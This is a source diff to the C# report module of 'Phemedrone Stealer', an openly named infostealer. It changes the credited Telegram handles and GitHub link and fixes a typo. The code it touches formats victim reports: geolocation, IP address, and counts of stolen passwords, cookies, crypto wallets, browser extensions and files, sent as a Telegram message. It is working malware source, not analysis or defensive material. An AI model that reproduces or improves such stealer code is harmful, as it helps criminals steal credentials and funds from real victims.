@@ -29,7 +29,7 @@ namespace Phemedrone.Services
     ,d88b.d88b,    
     88888888888    Phemedrone Stealer
     `Y8888888Y'    {DateTime.Now:dd/MM/yyyy HH:mm:ss}
-      `Y888Y'      Developed by https://t.me/reyvortex & https://t.me/TheDyer
+      `Y888Y'      Developed by https://t.me/webster480 & https://t.me/TheDyer
         `Y'        Tag: {Config.Tag}
 
     ----- Geolocation Data -----
@@ -58,7 +58,8 @@ namespace Phemedrone.Services
 {"Extensions",padding}{ServiceCounter.ExtensionsCount}
 {"Wallets:",padding}{ServiceCounter.WalletsCount}
 {"Files:",padding}{ServiceCounter.FilesCount}
-{"\nPasswrods Tags:",padding}{string.Join(", ", ServiceCounter.passwordstags.Distinct())}
+
+{"Passwords Tags:",padding}{string.Join(", ", ServiceCounter.passwordstags.Distinct())}
 {"Cookies Tags:",padding}{string.Join(", ", ServiceCounter.cookiestags.Distinct())}
     ----- Miscellaneous -----
 
@@ -83,7 +84,7 @@ namespace Phemedrone.Services
             var country = jsonParser.ParseString("country", JsonString);
             var countryCode = jsonParser.ParseString("countryCode", JsonString);
             
-                return $@"*Phemedrone Stealer Report* \| by @reyvortex & @TheDyer
+                return $@"*Phemedrone Stealer Report* \| by @webster480 & @TheDyer
 
 ``` - IP: {(ip.Length < 1 ? "Unknown" : ip.Replace(".", @"\."))} \({(country.Length < 1 ? "Unknown" : country)}\)
  - Tag: {Config.Tag} {(Config.BuildID.Length > 0 ? $"({Config.BuildID})" : "")}
@@ -91,7 +92,7 @@ namespace Phemedrone.Services
  - Cookies: {ServiceCounter.CookieCount}
  - Wallets: {ServiceCounter.WalletsCount}```
 
-https://github\.com/REvorker1/Phemedrone\-Stealer";
+https://github\.com/nullixx/Phemedrone\-Stealer";
             
         }
 
